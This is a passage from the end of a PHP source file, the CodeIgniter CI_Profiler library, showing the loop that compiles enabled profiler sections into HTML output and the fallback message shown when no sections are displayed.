		foreach ($this->_available_sections as $section)
		{
			if ($this->_compile_{$section} !== FALSE)
			{
				$func = "_compile_{$section}";
				$output .= $this->{$func}();
				$fields_displayed++;
			}
		}

		if ($fields_displayed == 0)
		{
			$output .= '<p style="border:1px solid #5a0099;padding:10px;margin:20px 0;background-color:#eee">'.$this->CI->lang->line('profiler_no_profiles').'</p>';
		}

		$output .= '</div>';

		return $output;
	}
}

// END CI_Profiler class

/* End of file Profiler.php */
/* Location: ./system/libraries/Profiler.php */